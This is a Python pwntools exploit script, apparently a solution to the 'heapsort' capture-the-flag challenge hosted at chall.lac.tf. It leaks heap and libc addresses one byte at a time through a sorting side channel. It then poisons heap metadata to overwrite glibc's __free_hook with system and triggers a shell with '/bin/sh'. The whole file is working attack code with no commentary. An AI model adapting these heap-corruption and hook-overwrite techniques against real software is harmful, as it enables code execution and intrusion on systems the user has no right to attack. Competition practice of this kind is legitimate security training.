#!/usr/bin/env python3

from pwn import *

exe = ELF("./heapsort")
libc = ELF("./libc.so.6")

serv = "chall.lac.tf"
port = 31168

context.binary = exe

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
            """)
    return r

r = conn()

def add(data):
    r.sendlineafter(b"choice:", b"1")
    r.sendlineafter(b"size:", str(0xf8).encode())
    r.sendafter(b"data:", data)

def free(idx):
    r.sendlineafter(b"choice:", b"2")
    r.sendlineafter(b"idx:", str(idx).encode())

def view(idx):
    r.sendlineafter(b"choice:", b"3")
    r.sendlineafter(b"idx:", str(idx).encode())

def sort():
    r.sendlineafter(b"choice:", b"4")

def doleak(n, idx, partial):
    leak = partial
    for i in range(n):
        test = 0
        start = 0 
        end = 0x100
        while start < end:
            mid = (start + end) // 2
            add(leak + p8(mid))
            sort()
            view(idx)
            gt = b"cannot" in r.recvline()
            if gt:
                free(idx+1)
                end = mid
            else:
                free(idx)
                start = mid + 1
            if start == mid or start >= end:
                test = start
                break
        if test >= 256:
            print("unlucky")
            exit()
        add(leak + p8(test))
        sort()
        view(idx)
        gt = b"cannot" in r.recvline()
        if gt:
            free(idx+1)
            test -= 1
        else:
            free(idx)
        if test < 0:
            test = 0
        leak += p8(test)
    return leak

def main():
    for _ in range(5):
        add(b"\x00")
    for _ in range(7):
        add(b"\xff")
    heap = u64(doleak(4, 6, b"\xb0").ljust(8, b"\x00"))
    log.info(f"{hex(heap)=}")
    libc.address = u64(doleak(6, 7, b"\xe0").ljust(8, b"\x00"))-0x1ecbe0
    log.info(f"{hex(libc.address)=}")
    add(p64(0x404050))
    add(b"\xff")
    add(b"\xff"*8 + p64(heap-0x7e0))
    for i in range(5):
        free(i)
    for i in range(2):
        add(b"\xff")
    add(p64(libc.sym.__free_hook))
    sort()
    add(b"/bin/sh")
    add(p64(libc.sym.system))
    free(1)
    r.interactive()

if __name__ == "__main__":
    main()
